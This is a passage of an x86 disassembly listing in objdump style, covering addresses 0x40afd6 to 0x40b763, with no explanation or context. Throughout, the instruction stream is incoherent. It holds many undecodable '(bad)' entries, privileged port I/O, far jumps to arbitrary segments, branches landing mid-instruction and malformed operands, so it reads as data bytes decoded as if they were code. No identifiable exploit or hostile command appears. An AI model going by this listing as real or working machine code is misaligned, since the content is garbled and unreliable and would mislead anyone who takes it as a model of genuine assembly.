  40afd6:	das    
  40afd7:	fstp   QWORD PTR [ebp+0x44]
  40afda:	dec    ebp
  40afdb:	xlat   BYTE PTR ds:[ebx]
  40afdc:	test   al,0x5c
  40afde:	cli    
  40afdf:	bound  eax,QWORD PTR [edi-0x516bc4e3]
  40afe5:	mov    edi,0xa36aee40
  40afea:	add    al,0x7b
  40afec:	mov    cl,ah
  40afee:	nop    DWORD PTR [edx+ebx*2-0x5dcb7927]
  40aff6:	imul   eax,DWORD PTR [edx+eiz*4],0x7c8fb969
  40affd:	cmc    
  40affe:	jge    0x40afac
  40b000:	fisub  DWORD PTR [ebx+0x6693ea47]
  40b006:	pop    esp
  40b007:	outs   dx,BYTE PTR ds:[esi]
  40b008:	les    esi,FWORD PTR [esp+ebp*1+0x6f305a15]
  40b00f:	je     0x40b084
  40b011:	mov    BYTE PTR [edi+0x7c],bh
  40b014:	xchg   esp,eax
  40b015:	sub    eax,0x9179696c
  40b01a:	mov    BYTE PTR [eax+0x61],ah
  40b01d:	push   ecx
  40b01e:	cdq    
  40b01f:	inc    eax
  40b020:	sub    ch,dh
  40b022:	adc    al,0xdd
  40b024:	xor    eax,0x5dbaecf7
  40b029:	adc    eax,0xd38c06f8
  40b02e:	loope  0x40b093
  40b030:	jl     0x40b000
  40b032:	gs je  0x40b0a8
  40b035:	(bad)  
  40b036:	mov    esi,0x46ddda66
  40b03b:	mov    ah,0x4e
  40b03d:	rol    dh,0x8
  40b040:	jnp    0x40b055
  40b042:	add    BYTE PTR [eax-0x63],0x79
  40b046:	adc    DWORD PTR [esi],edx
  40b048:	fdivrp st(3),st
  40b04a:	(bad)  
  40b04b:	xchg   edi,eax
  40b04c:	xor    al,0x9f
  40b04e:	stos   BYTE PTR es:[edi],al
  40b04f:	cmp    eax,0xac50eb56
  40b054:	fadd   DWORD PTR [edi-0x3f]
  40b057:	(bad)  
  40b058:	mov    BYTE PTR [esi+0x690d81f8],bl
  40b05e:	stos   DWORD PTR es:[edi],eax
  40b05f:	call   0xa47ea169
  40b064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b065:	add    DWORD PTR [ecx+0x4bcfb6f3],0xffffffd7
  40b06c:	cmc    
  40b06d:	icebp  
  40b06e:	std    
  40b06f:	mul    DWORD PTR [esi]
  40b071:	aaa    
  40b072:	ror    BYTE PTR [ebx+0x20],cl
  40b075:	(bad)  ds:0xc76fea91
  40b07b:	mov    eax,ds:0x584121d
  40b080:	push   ebx
  40b081:	popf   
  40b082:	cmc    
  40b083:	(bad)  
  40b084:	fwait
  40b085:	ss jmp 0x530add0a
  40b08b:	sbb    edx,ebp
  40b08d:	jb     0x40b0a6
  40b08f:	inc    ebp
  40b090:	inc    esp
  40b091:	sar    DWORD PTR [ebx+0x47eec8d3],1
  40b097:	xchg   ecx,eax
  40b098:	std    
  40b099:	leave  
  40b09a:	fadd   QWORD PTR [ecx]
  40b09c:	int3   
  40b09d:	fistp  DWORD PTR [ebx-0x4a]
  40b0a0:	jecxz  0x40b097
  40b0a2:	addr16 jns 0x40b122
  40b0a5:	es out dx,al
  40b0a7:	fst    QWORD PTR [edi-0x3d]
  40b0aa:	std    
  40b0ab:	out    0xbf,al
  40b0ad:	jne    0x40b07c
  40b0af:	sub    BYTE PTR [eax],bh
  40b0b1:	jns    0x40b0e9
  40b0b3:	cmp    eax,0x209d4580
  40b0b8:	xor    bh,ah
  40b0ba:	jmp    0x19c2:0xd4dc9180
  40b0c1:	pop    esi
  40b0c2:	(bad)  
  40b0c4:	pop    ss
  40b0c5:	ins    DWORD PTR es:[edi],dx
  40b0c6:	push   ds
  40b0c7:	div    BYTE PTR [ecx-0xf]
  40b0ca:	jl     0x40b11e
  40b0cc:	add    DWORD PTR ss:[esp+edx*1],edi
  40b0d0:	push   esi
  40b0d1:	add    ebx,DWORD PTR [ecx-0x45]
  40b0d4:	scas   eax,DWORD PTR es:[edi]
  40b0d5:	xor    BYTE PTR [ebp+0xf],dl
  40b0d8:	dec    edx
  40b0d9:	pop    es
  40b0da:	adc    eax,0x769cfefa
  40b0df:	adc    cl,ah
  40b0e1:	aam    0xa3
  40b0e3:	retf   0xdd15
  40b0e6:	push   esp
  40b0e7:	call   0x71438e47
  40b0ec:	pop    esi
  40b0ed:	inc    eax
  40b0ee:	aaa    
  40b0ef:	dec    DWORD PTR [ebx+0x6480f189]
  40b0f5:	inc    ecx
  40b0f6:	int    0xf2
  40b0f8:	repnz imul eax,DWORD PTR [edi],0xffffffe3
  40b0fc:	mov    edi,0x1af1a8cf
  40b101:	in     al,dx
  40b102:	idiv   DWORD PTR [ebp-0x5ff48f1f]
  40b108:	inc    ebx
  40b109:	js     0x40b18a
  40b10b:	aas    
  40b10c:	aaa    
  40b10d:	or     DWORD PTR [eax-0xb],edi
  40b110:	es popa 
  40b112:	and    DWORD PTR [eax+0x638898e7],ebx
  40b118:	cmc    
  40b119:	fdecstp 
  40b11b:	mov    ?,WORD PTR [edi+ebx*2+0x459d0b1b]
  40b122:	mov    gs,WORD PTR [ebp-0x6105bd50]
  40b128:	cmp    eax,0x95f557cd
  40b12d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b12e:	pop    esi
  40b12f:	mov    ah,0xfd
  40b131:	jmp    0xc669bfde
  40b136:	xchg   BYTE PTR [edi+ebx*1-0x14],cl
  40b13a:	mov    ah,0x5c
  40b13c:	imul   edx,eax,0xf5aa34ff
  40b142:	sub    eax,0x831f3856
  40b147:	pop    es
  40b148:	sub    esi,0xffffff9f
  40b14b:	out    0x58,eax
  40b14d:	lea    ecx,[edx]
  40b14f:	sub    al,BYTE PTR [esi+0x52]
  40b152:	cmp    al,0x22
  40b154:	outs   dx,BYTE PTR cs:[esi]
  40b156:	cli    
  40b157:	pop    ecx
  40b158:	je     0x40b193
  40b15a:	outs   dx,DWORD PTR ds:[esi]
  40b15b:	mov    edx,0xb65693e5
  40b160:	das    
  40b161:	scas   al,BYTE PTR es:[edi]
  40b162:	jns    0x40b19b
  40b164:	clc    
  40b165:	sub    eax,0x86acfcb6
  40b16a:	sub    DWORD PTR [edi],ebx
  40b16c:	ins    DWORD PTR es:[edi],dx
  40b16d:	les    eax,FWORD PTR [eax-0xc053c70]
  40b173:	ror    edx,0x15
  40b176:	pushf  
  40b177:	mov    ?,WORD PTR [edx-0x17]
  40b17a:	push   0x14
  40b17c:	mov    esi,0xed604dc5
  40b181:	enter  0x339,0xda
  40b185:	popaw  
  40b187:	inc    ecx
  40b188:	adc    DWORD PTR [ebp-0x4ab24b5f],edx
  40b18e:	lds    esp,FWORD PTR [ebx+0x67]
  40b191:	mov    esp,0x5152afa8
  40b196:	mov    ch,ch
  40b198:	ror    BYTE PTR [eax],0x13
  40b19b:	cmp    ch,BYTE PTR [ebp+0x4d5c340c]
  40b1a1:	imul   ebx,DWORD PTR [edi-0x18ffb7f8],0xa
  40b1a8:	js     0x40b1d9
  40b1aa:	cdq    
  40b1ab:	out    dx,al
  40b1ac:	pushf  
  40b1ad:	mov    ah,0x76
  40b1af:	icebp  
  40b1b0:	clc    
  40b1b1:	dec    ebp
  40b1b2:	rol    DWORD PTR [edx+0x49721a62],0x59
  40b1b9:	jbe    0x40b146
  40b1bb:	cmp    BYTE PTR [edx-0xeffb979],cl
  40b1c1:	sub    esi,DWORD PTR [ecx+0x3d]
  40b1c4:	lea    esi,[esi]
  40b1c6:	shl    al,1
  40b1c8:	push   0x3d386b2f
  40b1cd:	xchg   esi,eax
  40b1ce:	es push ss
  40b1d0:	push   es
  40b1d1:	repnz xor BYTE PTR ds:[eax+ebx*8+0x60],0x18
  40b1d8:	dec    edi
  40b1d9:	ins    DWORD PTR es:[edi],dx
  40b1da:	sbb    BYTE PTR [ecx],al
  40b1dc:	xchg   DWORD PTR [ecx-0x42afa89a],eax
  40b1e2:	cmp    BYTE PTR [eax-0x15794dc6],ch
  40b1e8:	fcom   DWORD PTR [ebp+0x7302d666]
  40b1ee:	fwait
  40b1ef:	in     al,dx
  40b1f0:	cmp    cl,BYTE PTR [eax+0xa]
  40b1f3:	daa    
  40b1f4:	inc    eax
  40b1f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1f6:	add    eax,0xce4e6c13
  40b1fb:	push   ss
  40b1fc:	push   ebx
  40b1fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1fe:	mov    ds:0x7c8a99eb,al
  40b203:	std    
  40b204:	fimul  DWORD PTR [edi+0x46]
  40b207:	in     eax,0x8c
  40b209:	pop    edx
  40b20a:	test   eax,0xdd517fe3
  40b20f:	lahf   
  40b210:	mov    BYTE PTR [eax+ebp*8-0x15],0x13
  40b215:	data16 xchg BYTE PTR [ebx+0x3aa000fe],ch
  40b21c:	cmp    DWORD PTR [ecx-0x6b],ebp
  40b21f:	dec    ebx
  40b220:	bound  ebx,QWORD PTR [ecx+0x7d]
  40b223:	jno    0x40b256
  40b225:	jg     0x40b259
  40b227:	lock (bad) 
  40b229:	bound  ebp,QWORD PTR [esi+0x10]
  40b22c:	push   ebx
  40b22d:	or     eax,0x8ff1c45e
  40b232:	mov    al,ds:0x4176abdf
  40b237:	jb     0x40b21e
  40b239:	neg    BYTE PTR [edx+ecx*1-0x25]
  40b23d:	sbb    al,BYTE PTR [ecx+edi*8+0x781f9e43]
  40b244:	xchg   DWORD PTR [esp+esi*2+0x14566601],esp
  40b24b:	jl     0x40b24a
  40b24d:	icebp  
  40b24e:	sahf   
  40b24f:	or     BYTE PTR [eax],ch
  40b251:	nop
  40b252:	dec    edx
  40b253:	sub    BYTE PTR [esi+0x1a86a2fa],bh
  40b259:	shr    BYTE PTR [edi+ebp*4],1
  40b25c:	jmp    0x260a:0x4cec75fd
  40b263:	pop    esi
  40b264:	mov    edi,esi
  40b266:	into   
  40b267:	dec    edx
  40b268:	mov    ecx,0x6a06915f
  40b26d:	fst    QWORD PTR [ecx+0x18820788]
  40b273:	xchg   ah,ch
  40b275:	push   ebp
  40b276:	loope  0x40b251
  40b278:	pop    ds
  40b279:	frstor [ecx-0x1d]
  40b27c:	or     BYTE PTR ds:0xcf91eaab,dh
  40b282:	dec    eax
  40b283:	add    BYTE PTR cs:[esp+esi*2+0x6b],ch
  40b288:	adc    eax,0x827e75ef
  40b28d:	mov    bl,0xf9
  40b28f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b290:	and    DWORD PTR [ecx-0x40],esi
  40b293:	adc    eax,0xde3acf84
  40b298:	push   esp
  40b299:	ficom  DWORD PTR [ebp+0x79]
  40b29c:	aam    0x69
  40b29e:	int3   
  40b29f:	xlat   BYTE PTR ds:[ebx]
  40b2a0:	push   esi
  40b2a1:	cmp    DWORD PTR [edx+0x1c5ea3cc],esi
  40b2a7:	cdq    
  40b2a8:	dec    ebp
  40b2a9:	ror    DWORD PTR [edi+0x57d779b5],0x37
  40b2b0:	mov    BYTE PTR [edi+0x1161520f],ch
  40b2b6:	test   DWORD PTR [esi],0xe9c4efb1
  40b2bc:	fild   DWORD PTR [ebx-0x55c9891b]
  40b2c2:	xchg   esp,eax
  40b2c3:	int    0x6
  40b2c5:	in     eax,0x7c
  40b2c7:	mov    al,ds:0x8fd4260b
  40b2cc:	bound  edi,QWORD PTR [esp+ecx*1-0x236cca87]
  40b2d3:	fidivr DWORD PTR [edi+0x95883d7]
  40b2d9:	(bad)  
  40b2da:	pop    ss
  40b2db:	int    0x64
  40b2dd:	dec    eax
  40b2de:	pop    ds
  40b2df:	adc    DWORD PTR [esi+0x53],ecx
  40b2e2:	lea    ecx,[ecx+0x14618dcf]
  40b2e8:	mov    al,es:0x115ede7c
  40b2ee:	mov    eax,ds:0x14869cc5
  40b2f3:	out    0x60,eax
  40b2f5:	in     eax,dx
  40b2f6:	cmp    eax,DWORD PTR [eax]
  40b2f8:	(bad)  
  40b2f9:	aad    0x66
  40b2fb:	xor    DWORD PTR [esi+0x2],edi
  40b2fe:	pop    esi
  40b2ff:	sbb    eax,0x66c5f13d
  40b304:	lods   eax,DWORD PTR ds:[esi]
  40b305:	mov    ds:0x86e1bd7b,eax
  40b30a:	mov    dh,0xb8
  40b30c:	adc    al,0xc8
  40b30e:	inc    edx
  40b30f:	sar    BYTE PTR [edi-0x31],cl
  40b312:	daa    
  40b313:	loopne 0x40b2d5
  40b315:	sbb    DWORD PTR [eax],esi
  40b317:	(bad)  
  40b318:	aad    0xe8
  40b31a:	retf   0x3e4a
  40b31d:	lods   eax,DWORD PTR ds:[esi]
  40b31e:	fidivr DWORD PTR [ebx-0x51523ea3]
  40b324:	bound  ebp,QWORD PTR [esi]
  40b326:	int    0xc6
  40b328:	in     eax,0x78
  40b32a:	xor    esp,edi
  40b32c:	jo     0x40b306
  40b32e:	inc    ebp
  40b32f:	push   ds
  40b330:	dec    esi
  40b331:	mov    cl,0xaa
  40b333:	imul   al
  40b335:	lods   al,BYTE PTR ds:[esi]
  40b336:	mov    ebp,0xd859920d
  40b33b:	cmp    ch,BYTE PTR [eax+0x52e7413b]
  40b341:	dec    ebx
  40b342:	outs   dx,BYTE PTR ds:[esi]
  40b343:	cli    
  40b344:	add    dh,cl
  40b346:	mov    eax,ds:0x510425ce
  40b34b:	aam    0x81
  40b34d:	jns    0x40b38c
  40b34f:	popf   
  40b350:	adc    DWORD PTR [ebp+esi*2-0x69],ebp
  40b354:	jecxz  0x40b347
  40b356:	in     al,0x22
  40b358:	or     ebx,edi
  40b35a:	enterw 0x569d,0xb4
  40b35f:	pop    es
  40b360:	imul   dh
  40b362:	test   BYTE PTR [edx],dh
  40b364:	inc    eax
  40b365:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b366:	je     0x40b311
  40b368:	lahf   
  40b369:	add    esi,DWORD PTR [ecx]
  40b36b:	fstp   DWORD PTR [ebp-0x20]
  40b36e:	or     ecx,edi
  40b370:	nop
  40b371:	mov    ebp,DWORD PTR [edx+0x4f6530d1]
  40b377:	test   edi,ebx
  40b379:	test   BYTE PTR [esi-0x46ab77f4],bl
  40b37f:	mov    ah,BYTE PTR [ebp+esi*2+0x6de32502]
  40b386:	(bad)  
  40b387:	out    dx,eax
  40b388:	push   eax
  40b389:	pop    ebx
  40b38a:	push   cs
  40b38b:	push   ebx
  40b38c:	mov    eax,ds:0xf00770ba
  40b391:	push   esp
  40b392:	aad    0x86
  40b394:	stos   DWORD PTR es:[edi],eax
  40b395:	pop    ebx
  40b396:	outs   dx,DWORD PTR ds:[esi]
  40b397:	sti    
  40b398:	pusha  
  40b399:	pop    eax
  40b39a:	push   es
  40b39b:	icebp  
  40b39c:	aam    0xbd
  40b39e:	dec    ecx
  40b39f:	pushf  
  40b3a0:	jge    0x40b37e
  40b3a2:	or     al,0x86
  40b3a4:	xor    esp,DWORD PTR [ecx]
  40b3a6:	mov    ah,0x89
  40b3a8:	mov    esi,0x42096fb1
  40b3ad:	outs   dx,BYTE PTR ds:[esi]
  40b3ae:	mov    dh,0x6a
  40b3b0:	int3   
  40b3b1:	mov    dl,0xfe
  40b3b3:	adc    edi,DWORD PTR [edx-0x24]
  40b3b6:	sbb    BYTE PTR [esi],dh
  40b3b8:	push   ecx
  40b3b9:	ret    0x59dc
  40b3bc:	retf   0xc86b
  40b3bf:	sbb    ch,BYTE PTR [ebx-0x53]
  40b3c2:	and    eax,0x2971f9f4
  40b3c7:	ret    
  40b3c8:	sub    eax,0xb420d02b
  40b3cd:	loopne 0x40b377
  40b3cf:	xchg   edi,eax
  40b3d0:	mov    cl,0x70
  40b3d2:	and    DWORD PTR [ecx+0x4db8b857],ebx
  40b3d8:	sbb    DWORD PTR [eax],esi
  40b3da:	loopne 0x40b456
  40b3dc:	(bad)  
  40b3dd:	dec    eax
  40b3de:	and    esp,DWORD PTR [eax]
  40b3e0:	aas    
  40b3e1:	retf   0x6188
  40b3e4:	or     DWORD PTR [ecx],eax
  40b3e6:	add    ecx,DWORD PTR [ebx]
  40b3e8:	mov    bl,0x5f
  40b3ea:	out    dx,al
  40b3eb:	cld    
  40b3ec:	out    dx,eax
  40b3ed:	ss inc edx
  40b3ef:	popf   
  40b3f0:	mov    ecx,0xef487f75
  40b3f5:	push   cs
  40b3f6:	pop    edi
  40b3f7:	fstp   QWORD PTR [edi+eax*2+0x74396263]
  40b3fe:	or     eax,0xaf7034e0
  40b403:	shl    esi,1
  40b405:	pop    eax
  40b406:	test   DWORD PTR [eax],edx
  40b408:	jae    0x40b3f0
  40b40a:	or     BYTE PTR [edx-0x7ff9c7cc],bh
  40b410:	push   cs
  40b411:	data16 fistp QWORD PTR [edi-0x4c]
  40b415:	call   0x8654:0x1d37e011
  40b41c:	inc    esi
  40b41d:	sbb    ecx,DWORD PTR [edx-0x7]
  40b420:	in     eax,0x4
  40b422:	je     0x40b3a4
  40b424:	jne    0x40b41f
  40b426:	rcl    BYTE PTR [esi+eiz*1-0x76d93879],0x1c
  40b42e:	in     eax,dx
  40b42f:	retf   
  40b430:	fidivr DWORD PTR [edx+eiz*4+0x6b]
  40b434:	shl    BYTE PTR [esi],0xc9
  40b437:	mov    bh,BYTE PTR [ecx+0x19a78ed9]
  40b43d:	lock ret 0xd46b
  40b441:	aaa    
  40b442:	mov    edx,0x2a720a05
  40b447:	dec    ecx
  40b448:	inc    esp
  40b449:	xor    eax,0xb2cd07d5
  40b44e:	jge    0x40b3f8
  40b450:	inc    eax
  40b451:	mov    dh,0xfe
  40b453:	(bad)  [ebx]
  40b455:	pushf  
  40b456:	cs scas al,BYTE PTR es:[edi]
  40b458:	xchg   esi,eax
  40b459:	pop    esp
  40b45a:	in     eax,dx
  40b45b:	lahf   
  40b45c:	mov    DWORD PTR [edi-0x7ac93163],0x24166481
  40b466:	js     0x40b495
  40b468:	mov    dh,0x59
  40b46a:	xor    ah,BYTE PTR [edx+0x1f22363d]
  40b470:	cli    
  40b471:	rcr    DWORD PTR [edx+0xc],cl
  40b474:	jbe    0x40b4cc
  40b476:	enter  0x6490,0xb7
  40b47a:	stos   DWORD PTR es:[edi],eax
  40b47b:	ds xchg edx,eax
  40b47d:	in     eax,0x2d
  40b47f:	jmp    0xa24d7db2
  40b484:	stos   BYTE PTR es:[edi],al
  40b485:	out    dx,al
  40b486:	dec    edi
  40b487:	cmc    
  40b488:	mov    DWORD PTR [esi-0x7a6d7a22],ebx
  40b48e:	mov    esp,ebx
  40b490:	loope  0x40b4b9
  40b492:	popf   
  40b493:	cmp    eax,0xb512832
  40b498:	fs aas 
  40b49a:	jne    0x40b43c
  40b49c:	xlat   BYTE PTR ds:[ebx]
  40b49d:	jge    0x40b48a
  40b49f:	ss repz retf 0x3466
  40b4a4:	add    DWORD PTR [esi-0x49],0xdb2fa225
  40b4ab:	dec    ecx
  40b4ac:	add    DWORD PTR [edx-0x18],ebp
  40b4af:	dec    ecx
  40b4b0:	sahf   
  40b4b1:	dec    eax
  40b4b2:	xchg   ebp,eax
  40b4b3:	popf   
  40b4b4:	mov    al,0xf7
  40b4b6:	pop    eax
  40b4b7:	cmp    al,0x6a
  40b4b9:	push   cs
  40b4ba:	es jb  0x40b52b
  40b4bd:	add    eax,0xcd050ba5
  40b4c2:	out    dx,al
  40b4c3:	xor    ebp,DWORD PTR [ecx-0x3607783c]
  40b4c9:	sub    DWORD PTR [esi-0x587061e6],edx
  40b4cf:	sbb    DWORD PTR [edx+eiz*8-0xb39a171],0xabc3b129
  40b4da:	sub    DWORD PTR ds:0xf52b7795,esp
  40b4e0:	fs push cs
  40b4e2:	inc    esp
  40b4e3:	es popa 
  40b4e5:	int3   
  40b4e6:	shl    esp,0x6d
  40b4e9:	add    esp,DWORD PTR fs:[esp+eax*4+0x66813b2c]
  40b4f1:	hlt    
  40b4f2:	push   0x9efa4fa5
  40b4f7:	jecxz  0x40b4cc
  40b4f9:	data16 repz fdivr DWORD PTR [edi]
  40b4fd:	cmp    bh,ah
  40b4ff:	lods   al,BYTE PTR ds:[esi]
  40b500:	mov    bh,0xe6
  40b502:	mov    edx,0x2b064fb2
  40b507:	je     0x40b4d0
  40b509:	mov    WORD PTR [edx],ds
  40b50b:	sar    DWORD PTR [ecx],1
  40b50d:	xor    bh,ah
  40b50f:	cli    
  40b510:	loopne 0x40b585
  40b512:	jg     0x40b554
  40b514:	imul   esi,DWORD PTR [esi+0xbb431d3],0x4
  40b51b:	ja     0x40b4ff
  40b51d:	loop   0x40b577
  40b51f:	shr    DWORD PTR [ebp-0x55cd2655],1
  40b525:	rcl    ebp,cl
  40b527:	mov    ds:0x5bc14d8b,al
  40b52c:	sub    al,0x84
  40b52e:	pop    ecx
  40b52f:	stos   BYTE PTR es:[edi],al
  40b530:	in     al,dx
  40b531:	call   0x8a6e469b
  40b536:	xchg   edi,eax
  40b537:	dec    edi
  40b538:	push   ebx
  40b539:	cmp    DWORD PTR [edi],edx
  40b53b:	mov    dh,0xcd
  40b53d:	in     al,dx
  40b53e:	mov    bh,0x43
  40b540:	nop
  40b541:	retf   
  40b542:	cmp    ebx,DWORD PTR [ebx]
  40b544:	jne    0x40b535
  40b546:	cmp    eax,0x5b74cc06
  40b54b:	outs   dx,BYTE PTR ds:[esi]
  40b54c:	fadd   QWORD PTR [eax+0x59f3765c]
  40b552:	cmp    BYTE PTR [ebp+0x50],bh
  40b555:	ins    DWORD PTR es:[edi],dx
  40b556:	xor    ecx,ebx
  40b558:	xchg   edi,eax
  40b559:	icebp  
  40b55a:	in     eax,dx
  40b55b:	iret   
  40b55c:	pop    ss
  40b55d:	stos   DWORD PTR es:[edi],eax
  40b55e:	sbb    ebp,DWORD PTR [ebx+0x1f]
  40b561:	xor    BYTE PTR [esi+0x11],al
  40b564:	out    0x6,eax
  40b566:	jl     0x40b51f
  40b568:	inc    eax
  40b569:	sub    ebx,DWORD PTR [edi+0x3c53149f]
  40b56f:	retf   
  40b570:	xor    eax,0x52ff41cf
  40b575:	mov    esp,0x2b88377
  40b57a:	mov    dl,0xfb
  40b57c:	cmovp  eax,DWORD PTR [eax-0x12]
  40b580:	lahf   
  40b581:	clc    
  40b582:	or     ah,0x96
  40b585:	in     eax,0x44
  40b587:	std    
  40b588:	cmp    DWORD PTR [edx+0x13875192],edi
  40b58e:	cmp    BYTE PTR [ebx],cl
  40b590:	mov    DWORD PTR [eax-0x37],esi
  40b593:	fldenv [esi-0x647d34b1]
  40b599:	adc    DWORD PTR [edx],eax
  40b59b:	mov    al,ds:0x590d6136
  40b5a0:	inc    ebx
  40b5a1:	mov    BYTE PTR ds:0xa3a086cb,bh
  40b5a7:	out    dx,al
  40b5a8:	or     eax,0x80149994
  40b5ad:	es mov cl,0xa8
  40b5b0:	hlt    
  40b5b1:	mov    ss,WORD PTR [eax-0x69]
  40b5b4:	mov    cl,0xf1
  40b5b6:	xchg   ebx,eax
  40b5b7:	cmc    
  40b5b8:	sub    bh,BYTE PTR [esi+0x6cb4510b]
  40b5be:	mov    bl,0x56
  40b5c0:	scas   al,BYTE PTR es:[edi]
  40b5c1:	push   DWORD PTR [edi-0x4a]
  40b5c4:	sbb    eax,0x31e1789d
  40b5c9:	mov    dh,bl
  40b5cb:	fs ror esp,1
  40b5ce:	xor    dh,ah
  40b5d0:	pop    ebp
  40b5d1:	pop    ecx
  40b5d2:	stc    
  40b5d3:	pop    edx
  40b5d4:	dec    ebp
  40b5d5:	pusha  
  40b5d6:	xchg   ebx,eax
  40b5d7:	inc    ebx
  40b5d8:	xchg   esi,eax
  40b5d9:	test   eax,0x3d26a397
  40b5de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5df:	mov    dl,0x20
  40b5e1:	inc    ebx
  40b5e2:	adc    ecx,DWORD PTR [eax+0x27]
  40b5e5:	pop    ecx
  40b5e6:	and    DWORD PTR [edi+0x1a23550d],0x935f5956
  40b5f0:	fwait
  40b5f1:	lock or al,BYTE PTR [ecx-0x17]
  40b5f5:	popf   
  40b5f6:	ins    DWORD PTR es:[edi],dx
  40b5f7:	test   eax,0xfcbe0113
  40b5fc:	iret   
  40b5fd:	sub    esi,eax
  40b5ff:	cdq    
  40b600:	jg     0x40b66f
  40b602:	shl    esp,1
  40b604:	out    dx,al
  40b605:	mov    eax,0xc0609ab
  40b60a:	mov    ebx,0xccd82475
  40b60f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b610:	adc    al,BYTE PTR [edx+ecx*4-0x63]
  40b614:	sahf   
  40b615:	dec    esi
  40b616:	mov    esi,0x18c579bc
  40b61b:	aad    0xd5
  40b61d:	push   0x64
  40b61f:	xchg   edi,eax
  40b620:	in     al,0x6c
  40b622:	lods   eax,DWORD PTR ds:[esi]
  40b623:	jg     0x40b633
  40b625:	cmp    ah,BYTE PTR [ebx+0x1ced54b0]
  40b62b:	mov    ah,0x14
  40b62d:	xor    al,0x7a
  40b62f:	add    cl,BYTE PTR [ebp+0x2fd2dec0]
  40b635:	jnp    0x40b663
  40b637:	jp     0x40b690
  40b639:	in     eax,dx
  40b63a:	fxch   st(5)
  40b63c:	mov    esi,0x2f185e31
  40b641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b643:	cmp    al,0x76
  40b645:	out    dx,al
  40b646:	add    DWORD PTR [edi-0x6e18952b],edi
  40b64c:	stos   DWORD PTR es:[edi],eax
  40b64d:	jl     0x40b5ff
  40b64f:	test   al,0xa6
  40b651:	pop    edx
  40b652:	push   edx
  40b653:	cwde   
  40b654:	mov    edi,0x109e30a3
  40b659:	jecxz  0x40b69b
  40b65b:	xchg   esp,eax
  40b65c:	neg    DWORD PTR [eax-0x356c38d2]
  40b662:	dec    esp
  40b663:	dec    edi
  40b664:	mov    bh,0x68
  40b666:	cmp    esp,edi
  40b668:	xchg   edi,eax
  40b669:	xor    esi,ebx
  40b66b:	sbb    ebx,DWORD PTR [ebx-0x20e0db7d]
  40b671:	add    bh,BYTE PTR [edi-0x3bc8c6d0]
  40b677:	call   0x907:0x4d9f7a3c
  40b67e:	jae    0x40b6d8
  40b680:	push   edi
  40b681:	xor    al,0xe8
  40b683:	gs mov ecx,0xed92e80d
  40b689:	xor    BYTE PTR [eax-0x6c060e99],bh
  40b68f:	ja     0x40b65c
  40b691:	mov    ebp,0x4a868fd3
  40b696:	cmp    DWORD PTR [ebx-0x4392beb7],ebp
  40b69c:	test   eax,0xaf210c61
  40b6a1:	mov    dh,0x7
  40b6a3:	dec    eax
  40b6a4:	in     eax,0x2a
  40b6a6:	mov    bh,0xb2
  40b6a8:	add    DWORD PTR [ebx+eiz*1-0x3c0c19c0],edi
  40b6af:	dec    edi
  40b6b0:	dec    eax
  40b6b1:	or     BYTE PTR [edi+ecx*1],bl
  40b6b4:	push   eax
  40b6b5:	mov    al,0x53
  40b6b7:	out    0xee,al
  40b6b9:	xor    BYTE PTR [esi+0x650297cb],dl
  40b6bf:	inc    esp
  40b6c0:	sbb    bl,BYTE PTR [eax+esi*8-0x1771a6c]
  40b6c7:	xor    al,BYTE PTR [ebx-0x6]
  40b6ca:	add    dh,dl
  40b6cc:	scas   eax,DWORD PTR es:[edi]
  40b6cd:	xchg   edx,eax
  40b6ce:	or     dh,BYTE PTR [edx+0x0]
  40b6d1:	mov    al,ds:0x551b4b01
  40b6d6:	lea    eax,[edi+esi*4]
  40b6d9:	(bad)  
  40b6db:	push   esp
  40b6dc:	jb     0x40b6b0
  40b6de:	mov    bh,al
  40b6e0:	pop    ebp
  40b6e1:	lods   eax,DWORD PTR ds:[esi]
  40b6e2:	mov    ecx,0x8a3aba79
  40b6e7:	mov    es,WORD PTR [ecx+ebx*4-0x2e]
  40b6eb:	inc    edx
  40b6ec:	or     al,BYTE PTR [edx]
  40b6ee:	sbb    BYTE PTR [ecx-0x67],al
  40b6f1:	mov    ds:0x6f96814d,eax
  40b6f6:	push   0xffffff8d
  40b6f8:	je     0x40b76f
  40b6fa:	(bad)  
  40b6fc:	lods   al,BYTE PTR ds:[esi]
  40b6fd:	repnz in eax,dx
  40b6ff:	scas   eax,DWORD PTR es:[edi]
  40b700:	(bad)  
  40b701:	div    BYTE PTR [esp+eiz*2]
  40b704:	add    DWORD PTR [edx+0x4c],0x7ca158d9
  40b70b:	xchg   ebp,eax
  40b70c:	dec    ebx
  40b70d:	inc    edi
  40b70e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b70f:	iret   
  40b710:	mov    BYTE PTR [ecx+0x2820d6f1],dl
  40b716:	cmp    ebp,ebp
  40b718:	imul   ecx,DWORD PTR [ebp-0x4a842b52],0x68
  40b71f:	and    esi,DWORD PTR [edx]
  40b721:	outs   dx,DWORD PTR ds:[esi]
  40b722:	push   cs
  40b723:	push   eax
  40b724:	(bad)  
  40b725:	data16 loop 0x40b6ec
  40b728:	xchg   ebp,eax
  40b729:	mov    dh,BYTE PTR [ecx-0x1e]
  40b72c:	sbb    al,0xa8
  40b72e:	jno    0x40b6e2
  40b730:	mov    dh,0x8a
  40b732:	addr16 test eax,0x579b8d44
  40b738:	dec    esi
  40b739:	lds    ebx,FWORD PTR [ebp+0x49962e5b]
  40b73f:	adc    bh,BYTE PTR [edi+0x31]
  40b742:	mov    WORD PTR [ebp+0x55],cs
  40b745:	jno    0x40b75b
  40b747:	push   0x0
  40b749:	pop    edx
  40b74a:	xor    eax,0x26b3c312
  40b74f:	ror    BYTE PTR [ebx+0xe],1
  40b752:	push   edi
  40b753:	repz mov dh,0xea
  40b756:	mov    esi,0xd7d37b19
  40b75b:	push   cs
  40b75c:	sysret 
  40b75e:	dec    ebp
  40b75f:	pop    ss
  40b760:	xchg   ebx,eax
  40b761:	fcmovb st,st(1)
  40b763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
